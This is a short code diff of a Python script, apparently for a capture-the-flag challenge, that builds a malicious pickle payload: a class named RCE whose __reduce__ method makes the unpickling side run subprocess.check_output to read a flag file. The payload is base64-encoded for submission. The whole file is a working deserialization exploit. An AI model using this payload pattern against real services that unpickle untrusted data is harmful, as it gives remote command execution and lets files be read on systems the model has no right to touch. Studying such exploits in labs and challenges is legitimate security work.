@@ -1,13 +1,12 @@
 import pickle
 import base64
-import subprocess
 import os
+import subprocess
 
 class RCE(object):
     def __reduce__(self):
-        return subprocess.check_output, (['cat', 'flag.txt'],)
+        cmd = ['cat','flag_wIp1b']
+        return subprocess.check_output, (cmd,)
 
-
-pickled = pickle.dumps({'secret': RCE() },protocol=0)
-#pickled = pickle.dumps(RCE(), 0)
+pickled = pickle.dumps({"serum":RCE()}, protocol=0)
 print(base64.b64encode(pickled))
